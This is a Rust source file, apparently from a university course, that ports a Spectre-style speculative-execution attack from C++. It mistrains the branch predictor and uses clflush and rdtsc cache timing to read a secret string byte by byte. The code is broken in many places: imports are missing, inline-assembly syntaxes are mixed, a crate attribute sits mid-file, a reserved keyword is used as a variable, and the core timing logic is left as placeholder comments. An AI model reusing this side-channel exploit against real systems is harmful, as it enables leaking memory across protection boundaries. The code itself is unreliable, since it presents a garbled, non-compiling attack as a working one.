extern crate core_affinity;

use std::arch::asm;
use std::mem;
use std::ptr;
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};

const CACHE_HIT_THRESHOLD: u64 = 80;
const NUM_TRIES: u64 = 1000;
const TRAINING_LOOPS: u64 = 100;
const ATTACK_LEAP: u64 = 10;
const INBETWEEN_DELAY: u64 = 100;
const LIKELY_THRESHOLD: u64 = (0.7 * NUM_TRIES as f64) as u64;
const SECRET: &str = "EECS 573";

// Counter for high-speed timer
// Donayam's suggestion
static TIMER_COUNTER: AtomicU64 = AtomicU64::new(0);

fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("eax") low,
            out("edx") high,
        );
    }
    (high as u64) << 32 | low as u64
}

fn high_speed_timer() {
    loop {
        TIMER_COUNTER.fetch_add(1, Ordering::Relaxed);
    }
}

unsafe fn clflush(addr: *const u8) {
    asm!("clflush [$0]" :: "r"(addr) :: "volatile");
}

fn init_attack() -> (Vec<bool>, Vec<u8>) {
    let mut is_attack = vec![false; TRAINING_LOOPS as usize];
    for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
        is_attack[i as usize] = true;
    }

    let mut attack_pattern: Vec<u8> = (0..256).collect();
    let mut rng = thread_rng();
    attack_pattern.shuffle(&mut rng);

    (is_attack, attack_pattern)
}

fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, arr1: &[u8], arr2: &[u8], attack_pattern: Vec<u8>,) -> String {
    let mut secret = String::new();

    for try in (1..=NUM_TRIES).rev() {
        // Flush arr2 from cache memory
        for i in 0..256 {
            clflush(&arr2[i * 512]);
        }

        let train_idx = try % arr1_size;
        let mut results = [0; 256];

        for i in (0..TRAINING_LOOPS).rev() {
            // Flush arr1_size from cache memory
            clflush(&arr1_size);

            // Add in-between delay cycles
            for _ in 0..INBETWEEN_DELAY {
                // You can implement a delay mechanism here
            }

            let idx = if is_attack[i as usize] {
                target_idx
            } else {
                train_idx
            };

            // Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address)
            fetch_function(&arr1, &arr2, idx);

            // Implement the timing attack logic here to measure cache access times for each character and update the `results` array
        }
        // Calculate the most likely character based on the results array and push it into the secret string
        let mut most_likely_char = '?';
        for i in (0..256).rev() {
            let curr_char = attack_pattern[i as usize];
            if results[curr_char as usize] >= LIKELY_THRESHOLD {
                if curr_char >= 31 && curr_char <= 127 {
                    most_likely_char = curr_char;
                    break;
                }
            }
        }
        secret.push(most_likely_char as char);
    }

    secret
}

#![feature(asm)]

fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
    // This function simulates the behavior of the C++ `fetch_function`.
    // It returns values from the shared memory, based on the `idx`.

    let mut value: i32 = -1;

    if idx < arr1.len() {
        // Ensure the index is within bounds of arr1_size
        let arr1_idx = arr1[idx] as usize;
        if arr1_idx < arr2.len() / 512 {
            // Calculate the index for arr2 based on arr1
            let arr2_idx = arr1_idx * 512;
            
            // Simulate cache access time measurement (you may need to adjust this)
            let mut time1: u64;
            let mut time2: u64;
            let junk: u64 = 0;
            
            unsafe {
                asm!(
                    "lfence",
                    "rdtscp",
                    "mov {}, rax",
                    "clflush [{}]",
                    "rdtscp",
                    "mov {}, rax",
                    "lfence",
                    out(reg) time1 => _,
                    in(reg) arr2_idx => _,
                    out(reg) junk => _,
                    out(reg) time2 => _,
                );
            }
            
            if time2 - time1 <= CACHE_HIT_THRESHOLD {
                // Cache hit, update the value
                value = arr2[arr2_idx];
            }
        }
    }

    value
}

fn main() {
    // Set the CPU affinity for the main thread
    core_affinity::set_for_current(core_affinity::get(core_affinity::CpuSet::new(0)).unwrap());

    // Create a separate thread for high-speed timer
    let timer_thread = thread::spawn(|| high_speed_timer());

    // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
    // You'll need to replace these placeholders with actual memory setup.
    let arr1 = [16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186];
    let arr2 = [0; 256 * 512]; // Placeholder, initialize with appropriate values

    let arr1_size = arr1.len();
    let target_idx = SECRET.as_ptr() as usize - arr1.as_ptr() as usize;
    let (is_attack, attack_pattern) = init_attack();
    let guessed_secret = read_memory_byte(target_idx, arr1_size, is_attack, &arr1, &arr2, attack_pattern);

    println!("THE GUESSED SECRET IS :: {}", guessed_secret);

    // Terminate the timer thread
    timer_thread.join().unwrap();
}

/*

Notes:

Shared Memory Setup: In the C++ code, there is an assumption of shared memory for arr1 and arr2. 
You need to set up shared memory correctly, making sure these arrays are in the same address space 
and are appropriately sized.

Cache Access Time Measurement: The code assumes cache access time measurement using the rdtscp and 
clflush instructions. May need to adjust the CACHE_HIT_THRESHOLD value based on your system's 
characteristics.

High-Speed Timer: The high-speed timer mechanism may not provide precise timing. 
Measuring cache access times in a real-world scenario can be complex and system-dependent.

Testing: May need to fine-tune the cache access timing logic.

*/